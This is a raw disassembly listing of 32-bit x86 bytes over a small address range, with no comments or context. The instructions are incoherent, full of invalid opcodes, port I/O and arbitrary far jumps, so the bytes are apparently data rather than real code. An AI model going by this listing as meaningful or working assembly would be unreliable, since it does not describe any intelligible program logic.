  406c40:	sub    BYTE PTR [eax],dl
  406c42:	retf   0xc9f8
  406c45:	lods   eax,DWORD PTR ds:[esi]
  406c46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c47:	daa    
  406c48:	jl     0x406c4b
  406c4a:	sar    BYTE PTR [eax+0x2e],0x8
  406c4e:	test   eax,0xcd7b4e97
  406c53:	(bad)  
  406c54:	rol    DWORD PTR ds:0x6155d9c3,1
  406c5a:	lods   eax,DWORD PTR ds:[esi]
  406c5b:	pop    ebx
  406c5c:	jmp    ebx
  406c5e:	sub    ebp,DWORD PTR [eax-0x72983b16]
  406c64:	cmp    WORD PTR [eax],si
  406c67:	aad    0xfc
  406c69:	retf   
  406c6a:	out    0x6a,eax
  406c6c:	cs in  al,dx
  406c6e:	mov    bl,0x2e
  406c70:	jg     0x406c0f
  406c72:	pop    edx
  406c73:	pop    edi
  406c74:	mov    fs,WORD PTR [edx+0x46148d64]
  406c7a:	cdq    
  406c7b:	stos   BYTE PTR es:[edi],al
  406c7c:	or     ah,BYTE PTR [esi-0x1b]
  406c7f:	or     DWORD PTR [ebp+0x7919edbf],0xb9311f2f
  406c89:	sbb    BYTE PTR [ecx-0x10],dl
  406c8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c8d:	jl     0x406c75
  406c8f:	jno    0x406c24
  406c91:	push   es
  406c92:	cwde   
  406c93:	out    0xc,eax
  406c95:	je     0x406c3b
  406c97:	icebp  
  406c98:	imul   ebx,DWORD PTR [edx],0x2d43f881
  406c9e:	adc    eax,esp
  406ca0:	pop    es
  406ca1:	in     eax,dx
  406ca2:	fisub  DWORD PTR [edx]
  406ca4:	pop    edx
  406ca5:	mov    bh,cl
  406ca7:	inc    esp
  406ca8:	mov    cl,0xfa
  406caa:	ja     0x406cdd
  406cac:	cwde   
  406cad:	leave  
  406cae:	push   esi
  406caf:	hlt    
  406cb0:	cmc    
  406cb1:	or     BYTE PTR [edx-0x9],cl
  406cb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cb5:	mov    ebp,DWORD PTR [eax-0x9ee63f2]
  406cbb:	inc    esp
  406cbc:	ja     0x406cdf
  406cbe:	dec    ebp
  406cbf:	imul   esi,DWORD PTR ds:0xe398baa8,0x30
  406cc6:	add    al,0x2b
  406cc8:	fwait
  406cc9:	lods   al,BYTE PTR ds:[esi]
  406cca:	sbb    bl,dl
  406ccc:	enter  0xd898,0xcb
  406cd0:	dec    ebx
  406cd1:	xlat   BYTE PTR ds:[ebx]
  406cd2:	jb     0x406ccd
  406cd4:	lds    edi,FWORD PTR [ebp-0x570e6efa]
  406cda:	mov    WORD PTR [eax-0x38],gs
  406cdd:	push   cs
  406cde:	adc    al,0xd7
  406ce0:	push   ebp
  406ce1:	xor    esp,DWORD PTR [ecx+ecx*4]
  406ce4:	sbb    eax,0xe6b2e91f
  406ce9:	inc    esp
  406cea:	add    al,BYTE PTR [esi+0x503a9dff]
  406cf0:	cmc    
  406cf1:	xchg   ebx,eax
  406cf2:	cli    
  406cf3:	icebp  
  406cf4:	das    
  406cf5:	jle    0x406d5b
  406cf7:	test   eax,0xab2368b3
  406cfc:	xchg   esi,eax
  406cfd:	ja     0x406ca5
  406cff:	inc    eax
  406d00:	and    al,0xb5
  406d02:	hlt    
  406d03:	push   ebp
  406d04:	mov    esp,0x4d444872
  406d0a:	add    al,0x25
  406d0c:	addr16 popf 
  406d0e:	dec    ebp
  406d0f:	ret    
  406d10:	pop    esi
  406d11:	aam    0xbe
  406d13:	pop    edi
  406d14:	aaa    
  406d15:	adc    BYTE PTR [ebp-0x2],cl
  406d18:	pop    edi
  406d19:	jb     0x406d95
  406d1b:	dec    eax
  406d1c:	push   ecx
  406d1d:	call   0xc6f4f633
  406d22:	pop    edi
  406d23:	pusha  
  406d24:	int    0xc
  406d26:	(bad)  
  406d27:	popa   
  406d28:	cmp    al,0x11
  406d2a:	(bad)  
  406d2b:	mov    edx,0x36309097
  406d30:	xchg   ebp,eax
  406d31:	inc    esp
  406d32:	in     eax,dx
  406d33:	int3   
  406d34:	mov    al,ds:0xb43463b0
  406d39:	jnp    0x406ccf
  406d3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d3c:	jecxz  0x406d77
  406d3e:	jo     0x406d06
  406d40:	lock idiv DWORD PTR [edx-0x235ca499]
  406d47:	dec    esp
  406d48:	sti    
  406d49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d4a:	add    eax,0xb874cd02
  406d4f:	lock fild DWORD PTR [ebx]
  406d52:	js     0x406d62
  406d54:	or     BYTE PTR [ecx-0x656e49f8],0x5a
  406d5b:	adc    al,0x20
  406d5d:	fnstenv [ecx]
  406d5f:	leave  
  406d60:	(bad)  
  406d61:	ret    
  406d62:	sbb    bl,BYTE PTR [edi-0x5e]
  406d65:	lds    edx,FWORD PTR [edi+0x2d]
  406d68:	lock push edx
  406d6a:	mov    dl,0xfc
  406d6c:	push   esi
  406d6d:	xchg   edi,eax
  406d6e:	loope  0x406d56
  406d70:	push   ebx
  406d71:	stos   DWORD PTR es:[edi],eax
  406d72:	out    dx,al
  406d73:	in     eax,0x41
  406d75:	xchg   ebp,eax
  406d76:	mov    eax,ds:0x55eb2324
  406d7b:	mov    esp,0x73609b90
  406d80:	lock jne 0x16dbe51a
  406d87:	adc    ebx,DWORD PTR [ebp-0x4]
  406d8a:	les    edx,FWORD PTR [ebx]
  406d8c:	pop    es
  406d8d:	adc    DWORD PTR [ebp-0x38cdd20e],esi
  406d93:	cmp    eax,DWORD PTR [edi+esi*8+0x7a2a1b32]
  406d9a:	enter  0x27c8,0x10
  406d9e:	loope  0x406e00
  406da0:	test   al,0xbc
  406da2:	ret    
  406da3:	pop    es
  406da4:	lock aad 0x2
  406da7:	sbb    al,0xca
  406da9:	sbb    BYTE PTR [ecx+0x63],ah
  406dac:	js     0x406d98
  406dae:	mov    ch,0xc5
  406db0:	push   esp
  406db1:	lahf   
  406db2:	outs   dx,BYTE PTR ds:[esi]
  406db3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406db4:	push   eax
  406db5:	addr16 ret 
  406db7:	push   edi
  406db8:	test   al,0xb7
  406dba:	imul   ecx,DWORD PTR [ecx],0x72
  406dbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406dbe:	int    0xd2
  406dc0:	mov    ds,WORD PTR [edx]
  406dc2:	test   al,0x4
  406dc4:	jne    0x406d6e
  406dc6:	mov    ebx,0x4727831c
  406dcb:	push   ecx
  406dcc:	fdiv   st(3),st
  406dce:	int3   
  406dcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406dd0:	ins    DWORD PTR es:[edi],dx
  406dd1:	int3   
  406dd2:	aam    0x11
  406dd4:	xchg   edi,ebp
  406dd6:	jmp    0x406e36
  406dd8:	rcl    BYTE PTR [ebp+0x18],1
  406ddb:	push   ss
  406ddc:	xchg   ebp,eax
  406ddd:	ffreep st(3)
  406ddf:	xchg   ebp,eax
  406de0:	mov    esp,0x7cd415ad
  406de5:	adc    eax,0xecfde73
  406dea:	mov    ch,dl
  406dec:	xor    eax,0xe83ea83d
  406df1:	bound  ecx,QWORD PTR [ecx-0x24d49f0d]
  406df7:	(bad)  
  406df8:	dec    ebx
  406df9:	fsub   st,st(6)
  406dfb:	mov    cl,0x42
  406dfd:	or     BYTE PTR [esi+eax*1+0xbab9e99],al
  406e04:	pop    edi
  406e05:	mov    edi,0x79e8d44d
  406e0a:	pushf  
  406e0b:	fmul   st(2),st
  406e0d:	jo     0x406e21
  406e0f:	dec    esi
  406e10:	adc    BYTE PTR [eax],cl
  406e12:	xor    eax,0x55320c75
  406e17:	cmp    dl,BYTE PTR [eax]
  406e19:	sbb    ecx,esp
  406e1b:	push   ebx
  406e1c:	hlt    
  406e1d:	mov    DWORD PTR [esi-0x394fd1f5],edx
  406e23:	bound  edx,QWORD PTR [eax+esi*2]
  406e26:	lods   eax,DWORD PTR ds:[esi]
  406e27:	shr    BYTE PTR [esi+0x14],1
  406e2a:	jnp    0x406e01
  406e2c:	call   0x1053:0x846e4118
  406e33:	pop    ebx
  406e34:	rcl    DWORD PTR [eax+0x6648fbd9],1
  406e3a:	lds    esi,FWORD PTR [edx-0x6f]
  406e3d:	dec    BYTE PTR ds:0x8784f7b3
  406e43:	pop    esi
  406e44:	aam    0xd5
  406e46:	push   edx
  406e47:	and    BYTE PTR [edx+0x4c2cb9ba],dh
  406e4d:	shl    DWORD PTR [ecx-0x7c],0x14
  406e51:	arpl   WORD PTR [eax],dx
  406e53:	add    eax,0xdb4d753d
  406e58:	and    BYTE PTR [esi+eiz*2],dh
  406e5b:	fadd   DWORD PTR [edi-0x6283e804]
  406e61:	out    0x99,eax
  406e63:	mov    ds:0x62494f43,eax
  406e68:	shr    eax,1
  406e6a:	stos   BYTE PTR es:[edi],al
  406e6b:	pushf  
  406e6c:	out    0x63,al
  406e6e:	xchg   edx,eax
  406e6f:	ss jl  0x406e84
  406e72:	fsubr  QWORD PTR [ebp+edx*8-0x73]
  406e76:	jg     0x406dfb
  406e78:	into   
  406e79:	sbb    al,0xe7
  406e7b:	retf   
  406e7c:	movnti DWORD PTR [ecx+0x58e20271],esi
  406e83:	rcl    bl,1
  406e85:	enter  0xcdac,0x10
  406e89:	shr    BYTE PTR [ebx-0x44],0x82
  406e8d:	sub    edx,esp
  406e8f:	mov    cl,0xa2
  406e91:	inc    edx
  406e92:	pop    esp
  406e93:	xchg   esp,eax
  406e94:	and    al,0x3e
  406e96:	dec    ecx
  406e97:	xor    BYTE PTR [ebp-0x134d3686],dh
  406e9d:	shr    DWORD PTR [ecx+0x50],0x68
  406ea1:	mov    bh,0xe9
  406ea3:	and    ecx,DWORD PTR [ebx-0x35]
  406ea6:	pop    es
  406ea7:	mov    esp,0x4a6dded4
  406eac:	ds (bad) 
  406eae:	cmp    ebp,ebp
  406eb0:	pop    es
  406eb1:	dec    BYTE PTR [edi]
  406eb3:	push   edi
  406eb4:	fistp  QWORD PTR [esp+ebx*8]
  406eb7:	xor    eax,0xb7462e34
  406ebc:	das    
  406ebd:	or     al,0x8c
  406ebf:	sbb    eax,0x84c88c47
  406ec4:	popf   
  406ec5:	or     eax,0xb9114360
  406eca:	call   0xef6ef253
  406ecf:	in     al,0xd1
  406ed1:	mov    cl,BYTE PTR [edx-0x6571a4d9]
  406ed7:	jmp    0x936eb348
  406edc:	rol    ebx,cl
  406ede:	ss mov cl,0x9e
  406ee1:	mov    ecx,0x319a578b
  406ee6:	or     bl,cl
  406ee8:	adc    BYTE PTR [edi-0x7f],ah
  406eeb:	retf   0x5039
  406eee:	stos   BYTE PTR es:[edi],al
  406eef:	fstp   st(0)
  406ef1:	push   esp
  406ef2:	in     eax,0x5b
  406ef4:	retf   0xc842
  406ef7:	jmp    0x1c78:0x31fe7cd7
  406efe:	adc    eax,0x4e32323d
  406f03:	daa    
  406f04:	lods   al,BYTE PTR ds:[esi]
  406f05:	push   eax
  406f06:	mov    dl,0xda
  406f08:	or     al,0xee
  406f0a:	pop    ds
  406f0b:	mov    ch,0x77
  406f0d:	inc    esi
  406f0e:	fdivr  DWORD PTR [edx+0x38]
  406f11:	pop    ds
  406f12:	mov    ch,0xd5
  406f14:	push   es
  406f15:	bound  eax,QWORD PTR [ebx]
  406f17:	cs jmp 0xc69d:0xd9a68a24
  406f1f:	int    0xe0
  406f21:	repnz into 
  406f23:	pushf  
  406f24:	ja     0x406ecf
  406f26:	or     bh,dh
  406f28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f29:	mov    al,0x28
  406f2b:	repnz out dx,al
  406f2d:	and    dl,BYTE PTR ds:0xf862f9e4
  406f33:	imul   ecx,DWORD PTR [edx+edx*4+0x14],0xffffffe3
  406f38:	jns    0x406fb7
  406f3a:	mov    ds:0xae9c5e6b,al
  406f3f:	or     dh,bh
  406f41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f42:	imul   esp,DWORD PTR [edx],0xffffffd3
  406f45:	mov    dh,0x39
  406f47:	out    0x6f,eax
  406f49:	lods   eax,DWORD PTR ds:[esi]
  406f4a:	xchg   edi,eax
  406f4b:	push   es
  406f4c:	aaa    
  406f4d:	cld    
  406f4e:	ja     0x406ef8
  406f50:	and    al,0x19
  406f52:	mov    dl,bl
  406f54:	frstor [eax]
  406f56:	push   ebx
  406f57:	loopne 0x406f21
  406f59:	inc    edx
  406f5a:	mov    eax,ds:0x61a269f3
  406f5f:	or     DWORD PTR [ecx],ebx
  406f61:	pusha  
  406f62:	cmc    
  406f63:	and    al,0xa4
  406f65:	xor    al,0xb5
  406f67:	sbb    BYTE PTR [ecx+0x336d4c8e],0x83
  406f6e:	je     0x406f62
  406f70:	out    0xf1,al
  406f72:	push   ebx
  406f73:	add    ecx,edi
  406f75:	repz gs (bad) 
  406f78:	stos   BYTE PTR es:[edi],al
  406f79:	jmp    0x79d58976
  406f7e:	cmp    eax,0xa5f4d765
  406f83:	ins    BYTE PTR es:[edi],dx
  406f84:	or     DWORD PTR [ebp+0x1e9502e5],0xd3c6ffdf
  406f8e:	xchg   ebx,eax
  406f8f:	mov    ecx,0x954c1d53
  406f94:	mov    esi,0xb9b3f6f6
  406f99:	mov    ds:0x9765caf4,eax
  406f9e:	out    dx,eax
  406f9f:	arpl   WORD PTR [ecx+0x1c],cx
  406fa2:	les    edi,FWORD PTR [ecx-0x6751b0f]
  406fa8:	mov    WORD PTR [ecx+0x11f4f047],es
  406fae:	neg    DWORD PTR [eax+0xd]
  406fb1:	clc    
  406fb2:	scas   al,BYTE PTR es:[edi]
  406fb3:	pop    edx
  406fb4:	outs   dx,BYTE PTR ds:[esi]
  406fb5:	fist   WORD PTR [edi+0x5a611cf6]
  406fbb:	lea    ebp,[ecx]
  406fbd:	loope  0x406f8d
  406fbf:	scas   eax,DWORD PTR es:[edi]
  406fc0:	mov    cl,0x96
  406fc2:	je     0x406f49
  406fc4:	mov    eax,0xe19bc87a
  406fc9:	loop   0x40703c
  406fcb:	cwde   
  406fcc:	dec    eax
  406fcd:	mov    bh,0xce
  406fcf:	nop
  406fd0:	dec    ecx
  406fd1:	or     eax,0x92d9bce9
  406fd6:	xor    eax,0x9466320
  406fdb:	jge    0x406f76
  406fdd:	or     al,0xa6
  406fdf:	jbe    0x406fa9
  406fe1:	das    
  406fe2:	mov    ?,WORD PTR ds:0x9a914fa3
  406fe8:	addr16 dec edx
  406fea:	xor    eax,0x9bf8b548
  406fef:	clc    
  406ff0:	add    DWORD PTR [edi],edx
  406ff2:	pushf  
  406ff3:	add    BYTE PTR [esi-0x20eace8b],dl
  406ff9:	imul   esp,DWORD PTR [eax+0x7918d020],0x76
  407000:	jle    0x406fe8
  407002:	dec    edi
  407003:	scas   al,BYTE PTR es:[edi]
  407004:	sti    
  407005:	loop   0x406fa7
  407007:	mov    al,0x77
  407009:	enter  0x1e63,0xe2
  40700d:	mov    ebx,0x45c3f488
  407012:	xor    edx,DWORD PTR [esi-0x4e]
  407015:	frstor [ecx+0x1a]
  407018:	or     edi,DWORD PTR [edi+0x51]
  40701b:	stos   BYTE PTR es:[edi],al
  40701c:	nop
  40701d:	or     dl,BYTE PTR [eax]
  40701f:	cs mov ecx,0x8b139695
  407025:	inc    ecx
  407026:	inc    esp
  407028:	out    dx,al
  407029:	mov    edx,0xf45a015f
  40702e:	pop    edi
  40702f:	push   eax
  407030:	test   DWORD PTR [edx-0x6e],ecx
  407033:	pop    ecx
  407034:	sbb    edx,DWORD PTR [edi-0xe]
  407037:	and    ebx,ebx
  407039:	cmc    
  40703a:	jmp    0x43be:0x8ac7013a
  407041:	pop    esp
  407042:	cli    
  407043:	dec    esp
  407044:	xor    ch,cl
  407046:	ret    
  407047:	dec    edi
  407048:	mov    ecx,0x38b0587a
  40704d:	mov    al,ds:0xba4661da
  407052:	das    
  407053:	retf   
  407054:	shl    DWORD PTR [ecx+0x496f8526],0x10
  40705b:	test   eax,0x38a17999
  407060:	das    
  407061:	pop    edx
  407062:	mov    eax,ds:0x118d5e2e
  407067:	dec    ebx
  407068:	inc    ebp
  407069:	mov    esp,0x4b8d4951
  40706e:	dec    ebx
  40706f:	lods   eax,DWORD PTR ds:[esi]
  407070:	mov    ?,ebp
  407072:	jnp    0x406ff9
  407074:	inc    edi
  407075:	(bad)  
  407077:	mov    bh,0x8a
  407079:	or     DWORD PTR [edx-0x77],edi
  40707c:	ficom  WORD PTR [eax-0x3b]
  40707f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407080:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407081:	sbb    bl,bl
  407083:	lods   al,BYTE PTR ds:[esi]
  407084:	adc    DWORD PTR [edx-0x1425577c],esi
  40708a:	ins    BYTE PTR es:[edi],dx
  40708b:	or     eax,0xa7fa9947
  407090:	shl    BYTE PTR [edx+0x2f081be8],1
  407096:	xchg   esi,eax
  407097:	out    dx,eax
  407098:	fcomp  DWORD PTR [eax+edx*8+0x5c]
  40709c:	rol    BYTE PTR [eax+0x4e2ab0fa],cl
  4070a2:	aaa    
  4070a3:	stos   DWORD PTR es:[edi],eax
  4070a4:	jo     0x4070f2
  4070a6:	or     DWORD PTR [eax+0x7d],edi
  4070a9:	jbe    0x407102
  4070ab:	pusha  
  4070ac:	retf   0x80b4
  4070af:	push   ds
  4070b0:	xor    bl,BYTE PTR [edi-0x4f6b1f2f]
  4070b6:	into   
  4070b7:	add    bh,cl
  4070b9:	outs   dx,BYTE PTR ds:[esi]
  4070ba:	adc    DWORD PTR ds:0xca4104e7,ecx
  4070c0:	cmp    al,0xd5
  4070c2:	in     eax,dx
  4070c3:	popf   
  4070c4:	or     BYTE PTR [esi+0x2a5b910e],ch
  4070ca:	into   
  4070cb:	jecxz  0x40706c
  4070cd:	xor    DWORD PTR [ebx+0x145032c1],esi
  4070d3:	xor    ebp,DWORD PTR [edx]
  4070d5:	lahf   
  4070d6:	repnz xor edx,ebx
  4070d9:	aaa    
  4070da:	and    eax,0x1fe8a5ba
  4070df:	xor    BYTE PTR [edi+eiz*1-0x281331d5],0x6c
  4070e7:	js     0x4070a7
  4070e9:	call   0x6076a43f
  4070ee:	into   
  4070ef:	fs adc al,0x61
  4070f2:	lds    ebx,FWORD PTR ds:0x46fdb32b
  4070f8:	cmc    
  4070f9:	push   ss
  4070fa:	ja     0x407127
  4070fc:	shl    BYTE PTR [ebx],cl
  4070fe:	pop    ebx
  4070ff:	enter  0xa408,0xb4
  407103:	push   edi
  407104:	push   ss
  407105:	inc    ebp
  407106:	xchg   esi,eax
  407107:	and    DWORD PTR [esp+ebx*1+0x2a],esi
  40710b:	sbb    dl,bh
  40710d:	cmp    BYTE PTR [ebx],dh
  40710f:	cli    
  407110:	imul   ecx,edx,0x1e37e179
  407116:	adc    ebp,DWORD PTR [esi+edx*1]
  407119:	pop    edi
  40711a:	shl    BYTE PTR [esi],cl
  40711c:	add    BYTE PTR [edx+0x68c5799b],dl
  407122:	pop    ds
  407123:	jb     0x407158
  407125:	ret    
  407126:	pop    esp
  407127:	inc    edi
  407128:	push   0x25a2234a
  40712d:	sbb    DWORD PTR [edi+edi*1+0x33],ecx
  407131:	fist   WORD PTR [eax]
  407133:	and    edi,DWORD PTR [ebx+0x4f1b69b4]
  407139:	ins    BYTE PTR es:[edi],dx
  40713a:	xchg   ah,bl
  40713c:	cmc    
  40713d:	out    0x71,al
  40713f:	arpl   WORD PTR [edi+eax*4-0x24],dx
  407143:	and    al,0xdb
  407145:	add    edx,ebp
  407147:	cli    
  407148:	inc    esp
  407149:	jecxz  0x4071a3
  40714b:	push   ebp
  40714c:	scas   eax,DWORD PTR es:[edi]
  40714d:	pop    ebp
  40714e:	rcr    DWORD PTR [eax-0x120e45d8],cl
  407154:	sbb    ebp,DWORD PTR ds:0x6bc14cc1
  40715a:	mov    esi,0xed7ca860
  40715f:	sub    ah,BYTE PTR [esi-0x770f63d5]
  407165:	mov    ebp,0x9e20ba4f
  40716a:	lea    eax,[esi+ebp*8]
  40716d:	pop    edi
  40716e:	sbb    al,0xe9
  407170:	call   FWORD PTR [ecx+0x0]
  407173:	xchg   esp,eax
  407174:	mov    dh,0x5a
  407176:	push   0x11125a85
  40717b:	ins    BYTE PTR es:[edi],dx
  40717c:	jmp    0xfb7517ba
  407181:	jle    0x407190
  407183:	mov    ebx,ds
  407185:	adc    DWORD PTR [eax+0x4233a235],0xd8e31fd4
  40718f:	xor    bl,cl
  407191:	int    0x6c
  407193:	clc    
  407194:	or     edi,0xf026b3ab
  40719a:	rcr    BYTE PTR [ebp+0x29],cl
  40719d:	outs   dx,DWORD PTR ds:[esi]
  40719e:	call   FWORD PTR [ebx+0x405a4e65]
  4071a4:	or     DWORD PTR [eax],0x33208def
  4071aa:	out    dx,al
  4071ab:	addr16 dec edx
  4071ad:	in     al,0xf2
  4071af:	or     al,0x7b
  4071b1:	mov    al,ds:0xdf2d199e
  4071b6:	sbb    eax,ebx
  4071b8:	adc    DWORD PTR [esi-0x47],ecx
  4071bb:	out    dx,eax
  4071bc:	pop    ss
  4071bd:	xchg   esi,eax
  4071be:	mov    BYTE PTR [ecx],bh
  4071c0:	pop    esp
  4071c1:	xlat   BYTE PTR ds:[ebx]
  4071c2:	dec    BYTE PTR [eax+0x46]
  4071c5:	lock idiv BYTE PTR [ecx]
  4071c8:	addr16 push esp
  4071ca:	push   edi
  4071cb:	or     eax,0x5cecb381
  4071d0:	scas   al,BYTE PTR es:[edi]
  4071d1:	push   ebp
  4071d2:	call   0x5bf59260
  4071d7:	sub    al,0xd0
  4071d9:	mov    BYTE PTR [eax+eax*2+0x21],al
  4071dd:	fdiv   QWORD PTR [edi-0x16088cb4]
  4071e3:	das    
  4071e4:	push   eax
  4071e5:	xchg   esi,eax
  4071e6:	lahf   
  4071e7:	jno    0x407248
  4071e9:	mov    ds:0x8da0b475,al
  4071ee:	add    bl,dl
  4071f0:	jno    0x407231
  4071f2:	push   ds
  4071f3:	adc    al,0x27
  4071f5:	adc    al,ah
  4071f7:	iret   
  4071f8:	fisub  WORD PTR [ebp+0x50]
  4071fb:	inc    ecx
  4071fc:	test   BYTE PTR [esi],ch
  4071fe:	loopne 0x407232
  407200:	call   0x6635bb7e
  407205:	dec    edi
  407206:	xchg   ecx,eax
  407207:	add    eax,0xe6f2f94
  40720c:	retf   
  40720d:	sbb    al,0xf7
  40720f:	sub    dl,BYTE PTR [eax]
  407211:	fisub  DWORD PTR [eax-0x124e2331]
  407217:	sbb    bl,bh
  407219:	js     0x4071d6
  40721b:	mov    ds:0x1b07c4a7,al
  407220:	sbb    esi,DWORD PTR [edi+0x71098c61]
  407226:	dec    ebx
  407227:	aad    0x67
  407229:	mov    bh,0xb9
  40722b:	fidivr DWORD PTR [ecx+0x1a]
  40722e:	imul   edx,DWORD PTR [edx],0x84ad97cd
  407234:	in     eax,0xc2
  407236:	clc    
  407237:	and    eax,0xea42e890
  40723c:	pop    ebx
  40723d:	inc    ecx
  40723e:	(bad)  
  40723f:	cwde   
  407240:	mov    bh,0xfa
  407242:	outs   dx,BYTE PTR ds:[esi]
  407243:	adc    eax,0x807666ed
  407248:	out    0x57,eax
  40724a:	mov    edi,edi
  40724c:	pop    eax
  40724d:	mov    dh,0x8
  40724f:	mov    ebx,0x1124bf40
  407254:	cld    
  407255:	mov    ebp,0xdd32d2
  40725a:	aas    
  40725b:	push   cs
  40725c:	scas   eax,DWORD PTR es:[edi]
  40725d:	add    DWORD PTR [esi-0x7d],ebp
  407260:	xchg   dl,al
  407262:	iret   
  407263:	xlat   BYTE PTR ds:[ebx]
  407264:	and    eax,0x63755eda
  407269:	test   esp,ecx
  40726b:	jbe    0x4071fc
  40726d:	push   edi
  40726e:	pusha  
  40726f:	mov    ah,0x27
  407271:	imul   ebp,ecx,0xffffffb0
  407274:	addr16 ds xchg esi,eax
  407277:	popa   
  407278:	popf   
  407279:	cmp    ch,BYTE PTR ds:0x1b4c
  40727e:	push   edi
  40727f:	jnp    0x4072d4
  407281:	or     DWORD PTR [edi],ebp
  407283:	mov    dl,0x20
  407285:	pop    edi
  407286:	not    BYTE PTR [esi-0x6a]
  407289:	push   0x3fd4f0ed
  40728e:	ja     0x407235
  407290:	jmp    0x40724d
  407292:	ins    DWORD PTR es:[edi],dx
  407293:	sub    al,0x63
  407296:	or     BYTE PTR [ebx+0x8886f94],bh
  40729c:	test   eax,esp
  40729e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40729f:	les    esp,FWORD PTR [esi]
  4072a1:	mov    ecx,0xa7a7371b
  4072a6:	or     eax,0x4a109bb8
  4072ab:	xchg   esi,eax
  4072ac:	stos   BYTE PTR es:[edi],al
  4072ad:	mov    cl,0x1e
  4072af:	pusha  
  4072b0:	sub    al,0x3e
  4072b2:	mov    ecx,0x8c91fc55
  4072b7:	xchg   esp,eax
  4072b8:	xchg   BYTE PTR [edx+0xd680d2],al
  4072be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072bf:	sbb    bl,al
  4072c1:	lods   eax,DWORD PTR ds:[esi]
  4072c2:	fld    st(5)
  4072c4:	xchg   eax,esi
  4072c6:	and    ebx,esp
  4072c8:	xchg   edi,eax
  4072c9:	fdivr  st,st(7)
  4072cb:	mov    al,ds:0x47dcd1b7
  4072d0:	(bad)  
  4072d1:	cli    
  4072d2:	or     DWORD PTR [ebp+0x67],esi
  4072d5:	jmp    0xbe73:0x8e09dfd
  4072dc:	xor    BYTE PTR [edx+ecx*1],dh
  4072df:	pushf  
  4072e0:	(bad)  
  4072e2:	inc    ebx
  4072e3:	adc    DWORD PTR [edi],esp
  4072e5:	mov    esi,0x94198d17
  4072ea:	pop    edi
  4072eb:	stos   BYTE PTR es:[edi],al
  4072ec:	scas   al,BYTE PTR es:[edi]
  4072ed:	mov    al,0x7
  4072ef:	push   es
  4072f0:	mov    ecx,0x8950c768
  4072f5:	cmp    eax,0x1696b7f
  4072fa:	ss ss dec ecx
  4072fd:	push   eax
  4072fe:	mov    ah,0x71
  407300:	lahf   
  407301:	ja     0x40728c
  407303:	xchg   BYTE PTR [esi+ebx*8-0x3c],bh
  407307:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407308:	popa   
  407309:	mov    cs,WORD PTR [eax-0x28]
  40730c:	jno    0x4072cd
  40730e:	mov    edx,0x98ff2081
  407313:	mov    cl,dl
  407315:	sbb    ebx,DWORD PTR [eax]
  407317:	shl    ebp,cl
  407319:	pushf  
  40731a:	adc    BYTE PTR [ebx+0x6c107b02],dl
  407320:	ret    0x57d5
  407323:	or     dh,BYTE PTR [ebx-0x80]
  407326:	std    
  407327:	dec    esp
  407328:	sbb    eax,0x94e11aa7
  40732d:	sbb    BYTE PTR [ebp+0x21],ah
  407330:	dec    ecx
  407331:	sbb    BYTE PTR [edx-0x198cc95],dl
  407337:	adc    BYTE PTR [ebp-0x27],bl
  40733a:	jmp    0x5ffe:0xb4eb283c
  407341:	cmc    
  407342:	sbb    BYTE PTR [ecx],bh
  407344:	mov    dl,0x43
  407346:	push   esp
  407347:	xchg   esp,eax
  407348:	xor    eax,0xe9df8b56
  40734d:	mov    bh,0xf1
  40734f:	test   BYTE PTR [ecx+0x5d96ceaf],cl
  407355:	pop    es
  407356:	xchg   esp,eax
  407357:	mov    ebp,0xac440ecd
  40735c:	mov    al,0x67
  40735e:	inc    edx
  40735f:	or     esp,DWORD PTR [ecx]
  407361:	sbb    DWORD PTR ds:0x2144acf8,edx
  407367:	shl    ah,0x5
  40736a:	push   di
  40736c:	mov    dh,0x46
  40736e:	xor    eax,DWORD PTR [eax]
  407370:	adc    DWORD PTR [eax],edx
  407372:	(bad)  
  407373:	arpl   WORD PTR [edx+0x9],sp
  407376:	xchg   DWORD PTR [edx-0x503cf441],ebx
  40737c:	mov    edx,0x5e72a743
  407381:	lahf   
  407382:	out    dx,al
  407383:	test   al,0xe8
  407385:	(bad)  
  407386:	out    0xa6,al
  407388:	std    
  407389:	mov    ebx,0xe2e1d41d
  40738e:	adc    al,0x10
  407390:	std    
  407391:	out    dx,eax
  407392:	jp     0x4073c8
  407394:	jns    0x4073cf
  407396:	test   DWORD PTR [edx+0xb829d51],eax
  40739c:	push   eax
  40739d:	mov    ecx,0x95b5370f
  4073a2:	adc    DWORD PTR [ecx],esp
  4073a4:	push   ebx
  4073a5:	xchg   BYTE PTR [ebx+0x7b1ef032],al
  4073ab:	(bad)  
  4073ac:	adc    al,0xc6
  4073ae:	dec    esp
  4073af:	retf   0x9d71
  4073b2:	retf   
  4073b3:	shl    DWORD PTR [esp+edi*2+0x7de6bf65],0xcc
  4073bb:	push   esp
  4073bc:	nop
  4073bd:	push   ebx
  4073be:	cmp    DWORD PTR [edx-0x1a],0xfffffff2
  4073c2:	jno    0x4073f5
  4073c4:	test   esi,0xb11e2a4b
  4073ca:	jbe    0x4073fd
  4073cc:	lods   eax,DWORD PTR ds:[esi]
  4073cd:	jmp    0x4073b7
  4073cf:	enter  0x8b18,0xe1
  4073d3:	mov    fs,ebx
  4073d5:	les    ebp,FWORD PTR [esi]
  4073d7:	and    eax,0xe75a2b74
  4073dc:	jbe    0x407408
  4073de:	sbb    al,0x9a
  4073e0:	adc    esi,edi
  4073e2:	inc    ebp
  4073e3:	je     0x407407
  4073e5:	sub    al,0xc9
  4073e7:	cs pop ss
  4073e9:	test   BYTE PTR [ebx],dl
  4073eb:	leave  
  4073ec:	mov    cl,0x88
  4073ee:	mov    dh,al
  4073f0:	fnstenv [eax+0x61e89c00]
  4073f6:	imul   edx,DWORD PTR [ecx-0x68],0xb4a51e7
  4073fd:	leave  
